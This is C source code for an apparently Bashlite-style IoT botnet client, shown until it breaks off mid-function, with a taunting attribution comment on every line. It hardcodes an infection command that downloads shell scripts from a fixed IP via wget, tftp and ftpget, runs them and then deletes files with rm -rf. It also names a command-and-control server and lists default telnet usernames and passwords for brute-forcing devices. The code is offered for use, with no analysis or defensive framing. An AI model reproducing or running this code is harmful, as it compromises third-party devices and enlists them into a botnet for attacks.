#define PR_SET_NAME 15 // stop stealing ma code skidz -> https://github.com/riu-developer-owo
#define SERVER_LIST_SIZE (sizeof(commServer) / sizeof(unsigned char *)) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
#define PAD_RIGHT 1 // stop stealing ma code skidz -> https://github.com/riu-developer-owo
#define PAD_ZERO 2 // stop stealing ma code skidz -> https://github.com/riu-developer-owo
#define PRINT_BUF_LEN 12 // stop stealing ma code skidz -> https://github.com/riu-developer-owo
#define CMD_IAC   255 // stop stealing ma code skidz -> https://github.com/riu-developer-owo
#define CMD_WILL  251 // stop stealing ma code skidz -> https://github.com/riu-developer-owo
#define CMD_WONT  252 // stop stealing ma code skidz -> https://github.com/riu-developer-owo
#define CMD_DO    253 // stop stealing ma code skidz -> https://github.com/riu-developer-owo
#define CMD_DONT  254 // stop stealing ma code skidz -> https://github.com/riu-developer-owo
#define OPT_SGA   3 // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owo#include <stdlib.h> // stop stealing ma code skidz -> https://github.com/riu-developer-owo
#include <stdarg.h> // stop stealing ma code skidz -> https://github.com/riu-developer-owo
#include <stdio.h> // stop stealing ma code skidz -> https://github.com/riu-developer-owo
#include <sys/socket.h> // stop stealing ma code skidz -> https://github.com/riu-developer-owo
#include <sys/types.h> // stop stealing ma code skidz -> https://github.com/riu-developer-owo
#include <netinet/in.h> // stop stealing ma code skidz -> https://github.com/riu-developer-owo
#include <arpa/inet.h> // stop stealing ma code skidz -> https://github.com/riu-developer-owo
#include <netdb.h> // stop stealing ma code skidz -> https://github.com/riu-developer-owo
#include <signal.h> // stop stealing ma code skidz -> https://github.com/riu-developer-owo
#include <strings.h> // stop stealing ma code skidz -> https://github.com/riu-developer-owo
#include <string.h> // stop stealing ma code skidz -> https://github.com/riu-developer-owo
#include <sys/utsname.h> // stop stealing ma code skidz -> https://github.com/riu-developer-owo
#include <unistd.h> // stop stealing ma code skidz -> https://github.com/riu-developer-owo
#include <fcntl.h> // stop stealing ma code skidz -> https://github.com/riu-developer-owo
#include <errno.h> // stop stealing ma code skidz -> https://github.com/riu-developer-owo
#include <netinet/ip.h> // stop stealing ma code skidz -> https://github.com/riu-developer-owo
#include <netinet/udp.h> // stop stealing ma code skidz -> https://github.com/riu-developer-owo
#include <netinet/tcp.h> // stop stealing ma code skidz -> https://github.com/riu-developer-owo
#include <sys/wait.h> // stop stealing ma code skidz -> https://github.com/riu-developer-owo
#include <sys/ioctl.h> // stop stealing ma code skidz -> https://github.com/riu-developer-owo
#include <net/if.h> // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owochar *infectline = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.206.225.136/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 5.206.225.136 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 5.206.225.136; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 5.206.225.136 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; exit\r\n"; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owo// WGET LINE GOES HERE ^ // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owounsigned char *commServer[] = // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
"5.206.225.136:23" // stop stealing ma code skidz -> https://github.com/riu-developer-owo
}; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoint initConnection(); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int getBogos(unsigned char *bogomips); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int getCores(); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int getCountry(unsigned char *buf, int bufsize); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
void makeRandomStr(unsigned char *buf, int length); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int sockprintf(int sock, char *formatStr, ...); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
char *inet_ntoa(struct in_addr in); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoint mainCommSock = 0, currentServer = -1, gotIP = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
uint32_t *pids; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
uint32_t scanPid; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
uint64_t numpids = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
struct in_addr ourIP; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
unsigned char macAddress[6] = {0}; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
char *usernames[] = {"root\0", "admin\0", "user\0", "login\0", "guest\0", "support\0"}; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
char *passwords[] = {"root\0", "toor\0", "admin\0", "user\0", "guest\0", "login\0", "changeme\0", "1234\0", "12345\0", "123456\0", "default\0", "\0", "password\0", "support\0"}; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owo#define PHI 0x9e3779b9 // stop stealing ma code skidz -> https://github.com/riu-developer-owo
static uint32_t Q[4096], c = 362436; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owovoid init_rand(uint32_t x) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int i; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoQ[0] = x; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
Q[1] = x + PHI; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
Q[2] = x + PHI + PHI; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owofor (i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owouint32_t rand_cmwc(void) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
uint64_t t, a = 18782LL; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
static uint32_t i = 4095; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
uint32_t x, r = 0xfffffffe; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
i = (i + 1) & 4095; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
t = a * Q[i] + c; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
c = (uint32_t)(t >> 32); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
x = t + c; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if (x < c) { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
x++; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
c++; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
return (Q[i] = r - x); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owovoid trim(char *str) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int i; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int begin = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int end = strlen(str) - 1; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owowhile (isspace(str[begin])) begin++; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owowhile ((end >= begin) && isspace(str[end])) end--; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
for (i = begin; i <= end; i++) str[i - begin] = str[i]; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owostr[i - begin] = '\0'; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owostatic void printchar(unsigned char **str, int c) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if (str) { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
**str = c; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
++(*str); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
else (void)write(1, &c, 1); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owostatic int prints(unsigned char **out, const unsigned char *string, int width, int pad) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
register int pc = 0, padchar = ' '; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif (width > 0) { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
register int len = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
register const unsigned char *ptr; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
for (ptr = string; *ptr; ++ptr) ++len; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if (len >= width) width = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
else width -= len; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if (pad & PAD_ZERO) padchar = '0'; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if (!(pad & PAD_RIGHT)) { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
for ( ; width > 0; --width) { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
printchar (out, padchar); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
++pc; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
for ( ; *string ; ++string) { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
printchar (out, *string); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
++pc; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
for ( ; width > 0; --width) { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
printchar (out, padchar); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
++pc; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-oworeturn pc; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owostatic int printi(unsigned char **out, int i, int b, int sg, int width, int pad, int letbase) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
unsigned char print_buf[PRINT_BUF_LEN]; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
register unsigned char *s; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
register int t, neg = 0, pc = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
register unsigned int u = i; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif (i == 0) { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
print_buf[0] = '0'; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
print_buf[1] = '\0'; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
return prints (out, print_buf, width, pad); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif (sg && b == 10 && i < 0) { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
neg = 1; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
u = -i; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owos = print_buf + PRINT_BUF_LEN-1; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
*s = '\0'; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owowhile (u) { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
t = u % b; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if( t >= 10 ) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
t += letbase - '0' - 10; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
*--s = t + '0'; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
u /= b; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif (neg) { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if( width && (pad & PAD_ZERO) ) { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
printchar (out, '-'); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
++pc; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
--width; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
else { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
*--s = '-'; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-oworeturn pc + prints (out, s, width, pad); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owostatic int print(unsigned char **out, const unsigned char *format, va_list args ) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
register int width, pad; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
register int pc = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
unsigned char scr[2]; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owofor (; *format != 0; ++format) { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if (*format == '%') { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
++format; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
width = pad = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if (*format == '\0') break; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if (*format == '%') goto out; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if (*format == '-') { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
++format; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
pad = PAD_RIGHT; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
while (*format == '0') { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
++format; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
pad |= PAD_ZERO; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
for ( ; *format >= '0' && *format <= '9'; ++format) { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
width *= 10; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
width += *format - '0'; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if( *format == 's' ) { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
register char *s = (char *)va_arg( args, int ); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
pc += prints (out, s?s:"(null)", width, pad); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
continue; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if( *format == 'd' ) { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
pc += printi (out, va_arg( args, int ), 10, 1, width, pad, 'a'); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
continue; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if( *format == 'x' ) { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'a'); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
continue; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if( *format == 'X' ) { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'A'); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
continue; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if( *format == 'u' ) { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
pc += printi (out, va_arg( args, int ), 10, 0, width, pad, 'a'); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
continue; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if( *format == 'c' ) { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
scr[0] = (unsigned char)va_arg( args, int ); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
scr[1] = '\0'; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
pc += prints (out, scr, width, pad); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
continue; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
else { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
out: // stop stealing ma code skidz -> https://github.com/riu-developer-owo
printchar (out, *format); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
++pc; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if (out) **out = '\0'; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
va_end( args ); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
return pc; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoint zprintf(const unsigned char *format, ...) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
va_list args; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
va_start( args, format ); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
return print( 0, format, args ); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoint szprintf(unsigned char *out, const unsigned char *format, ...) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
va_list args; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
va_start( args, format ); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
return print( &out, format, args ); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owo
 // stop stealing ma code skidz -> https://github.com/riu-developer-owoint sockprintf(int sock, char *formatStr, ...) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
unsigned char *textBuffer = malloc(2048); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
memset(textBuffer, 0, 2048); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
char *orig = textBuffer; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
va_list args; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
va_start(args, formatStr); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
print(&textBuffer, formatStr, args); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
va_end(args); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
orig[strlen(orig)] = '\n'; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
zprintf("buf: %s\n", orig); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int q = send(sock,orig,strlen(orig), MSG_NOSIGNAL); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
free(orig); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
return q; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owostatic int *fdopen_pids; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoint fdpopen(unsigned char *program, register unsigned char *type) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
register int iop; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int pdes[2], fds, pid; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif (*type != 'r' && *type != 'w' || type[1]) return -1; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif (pipe(pdes) < 0) return -1; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if (fdopen_pids == NULL) { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if ((fds = getdtablesize()) <= 0) return -1; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if ((fdopen_pids = (int *)malloc((unsigned int)(fds * sizeof(int)))) == NULL) return -1; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
memset((unsigned char *)fdopen_pids, 0, fds * sizeof(int)); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoswitch (pid = vfork()) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
case -1: // stop stealing ma code skidz -> https://github.com/riu-developer-owo
close(pdes[0]); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
close(pdes[1]); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
return -1; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
case 0: // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if (*type == 'r') { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if (pdes[1] != 1) { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
dup2(pdes[1], 1); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
close(pdes[1]); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
close(pdes[0]); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} else { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if (pdes[0] != 0) { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
(void) dup2(pdes[0], 0); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
(void) close(pdes[0]); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
(void) close(pdes[1]); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
execl("/bin/sh", "sh", "-c", program, NULL); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
_exit(127); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if (*type == 'r') { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
iop = pdes[0]; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
(void) close(pdes[1]); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} else { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
iop = pdes[1]; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
(void) close(pdes[0]); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fdopen_pids[iop] = pid; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
return (iop); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoint fdpclose(int iop) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
register int fdes; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
sigset_t omask, nmask; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int pstat; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
register int pid; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif (fdopen_pids == NULL || fdopen_pids[iop] == 0) return (-1); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
(void) close(iop); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
sigemptyset(&nmask); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
sigaddset(&nmask, SIGINT); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
sigaddset(&nmask, SIGQUIT); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
sigaddset(&nmask, SIGHUP); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
(void) sigprocmask(SIG_BLOCK, &nmask, &omask); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
do { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
pid = waitpid(fdopen_pids[iop], (int *) &pstat, 0); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} while (pid == -1 && errno == EINTR); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
(void) sigprocmask(SIG_SETMASK, &omask, NULL); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fdopen_pids[fdes] = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
return (pid == -1 ? -1 : WEXITSTATUS(pstat)); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owounsigned char *fdgets(unsigned char *buffer, int bufferSize, int fd) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int got = 1, total = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; } // stop stealing ma code skidz -> https://github.com/riu-developer-owo
return got == 0 ? NULL : buffer; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owostatic const long hextable[] = { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
[0 ... 255] = -1, // stop stealing ma code skidz -> https://github.com/riu-developer-owo
['0'] = 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, // stop stealing ma code skidz -> https://github.com/riu-developer-owo
['A'] = 10, 11, 12, 13, 14, 15, // stop stealing ma code skidz -> https://github.com/riu-developer-owo
['a'] = 10, 11, 12, 13, 14, 15 // stop stealing ma code skidz -> https://github.com/riu-developer-owo
}; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owolong parseHex(unsigned char *hex) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
long ret = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
while (*hex && ret >= 0) ret = (ret << 4) | hextable[*hex++]; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
return ret; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoint wildString(const unsigned char* pattern, const unsigned char* string) { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
switch(*pattern) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
case '\0': return *string; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
